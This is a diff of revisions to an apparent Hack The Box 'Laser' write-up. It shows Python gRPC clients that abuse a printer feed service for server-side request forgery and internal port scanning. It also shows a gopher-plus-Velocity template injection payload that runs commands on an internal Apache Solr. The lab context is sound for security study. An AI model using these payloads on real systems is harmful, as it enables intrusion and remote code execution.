@@ -732,20 +732,20 @@ return service_pb2.Data(feed='Pushing feeds')
 ...
 Here is how a sample feed information looks like.
 {
-"version": "v1.0",
-"title": "Printer Feed",
-"home_page_url": "http://printer.laserinternal.htb/",
-"feed_url": "http://printer.laserinternal.htb/feeds.json",
-"items": [
-{
-"id": "2",
-"content_text": "Queue jobs"
-},
-{
-"id": "1",
-"content_text": "Failed items"
-}
-]
+  "version": "v1.0",
+  "title": "Printer Feed",
+  "home_page_url": "http://printer.laserinternal.htb/",
+  "feed_url": "http://printer.laserinternal.htb/feeds.json",
+  "items": [
+             {
+               "id": "2",
+               "content_text": "Queue jobs"
+             },
+             {
+               "id": "1",
+               "content_text": "Failed items"
+             }
+           ]
 }
 QA with Clients
 Gabriel (Client) : What optimisation measures you've taken ?
@@ -788,7 +788,10 @@ service FooService {
 
 > The first line of the file specifies that you're using proto3 syntax: if you don't do this the protocol buffer compiler will assume you are using proto2. This must be the first non-empty, non-comment line of the file.
 
-[https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)
+In the documentation for grpc and protocol buffers there were examples of how to communicate with this type of service using Python.
+
+* [https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) 
+* [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)
 
 ```text
 syntax = "proto3";
@@ -812,7 +815,7 @@ string feed = 1;
 }
 ```
 
-Using this information I created the above `.proto` file for telling the grpc protocol how to communicate with the service.
+Using this information, and the information from the PDF document I recovered, I created the above `.proto` file to tell the grpc client how to communicate with this particular service.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -829,8 +832,9 @@ import base64
 import pickle
 
 def test():
-    message = '{"feed_url":"http://10.10.15.98:8099"}'
+    message = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "http://10.10.15.98:8099"}'
     enc_message = base64.b64encode(pickle.dumps(message))
+    #Use insecure channel since we do not have credentials
     channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
     stub = laser_pb2_grpc.PrintStub(channel)
     response = stub.Feed(laser_pb2.Content(data=enc_message))
@@ -852,7 +856,7 @@ User-Agent: FeedBot v1.0
 Accept: */*
 ```
 
-I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. However, since I was able to entice the server to send me connections with information I controlled I figured I could try to do a Server Side Request Forgery \(SSRF\) attack.
+I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. However, since I was able to entice the server to send me connections with information I controlled I figured I could try to do a Server Side Request Forgery \(SSRF\) attack and maybe get it to pull a malicious file from my system.
 
 ```text
 On successful data transmission you should see a message....
@@ -880,7 +884,7 @@ grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
 >
 ```
 
-While doing some testing I forgot to start my listener, and got the above error message back since my computer refused the connection.
+While doing some testing I forgot to start my listener, and got the above error message back since my computer refused the connection.  The verbose error message came in handy later.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -906,7 +910,7 @@ I was able to ping the machine, so my connectivity wasn't the problem.
 
 ### Python port scanner - internal machine
 
-I decided that there may possibly be an internal port open that I cannot reach, therefore the errors. I needed some way of enumerating the inside.  Since I knew that a closed port gave a "Connection refused error", I could use this to filter responses.
+I decided that there may possibly be an internal port open that I couldn't reach, therefore the errors. I needed some way of enumerating the inside.  Since I knew that a closed port gave a "Connection refused error" I was able to use this to filter responses.
 
 * [https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) 
 * [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)
@@ -929,7 +933,7 @@ def scan():
         stub = laser_pb2_grpc.PrintStub(channel)
 
         #Testing to see if there are more ports open on the internal localhost using same message
-        message = '{' + f'"feed_url": "http://localhost:{port}"' + '}'
+        message = '{' + '"version": "v1.0", "title": "Printer Feed", ' + f'"feed_url": "http://localhost:{port}"' + '}'
         #print(f"Message sent is {message}")
         enc_message = base64.b64encode(pickle.dumps(message))
         content = laser_pb2.Content(data=enc_message)
@@ -1011,7 +1015,8 @@ data1 = "gopher://localhost:8983/_POST /solr/staging/config HTTP/1.1%0D%0AHost:1
 cmd = quote(sys.argv[1])
 data2 = f"http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
 
-feed = '{ "version" : "v1.0", "title" : "PrinterFeed", "feed_url" : "replaceMe"}'
+#Can't use direct variable substitution since I have two different vars this time.  Use feed.replace() instead
+feed = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "replaceMe"}'
 
 #no creds, so need insecure channel
 channel = grpc.insecure_channel("10.10.10.201:9000")
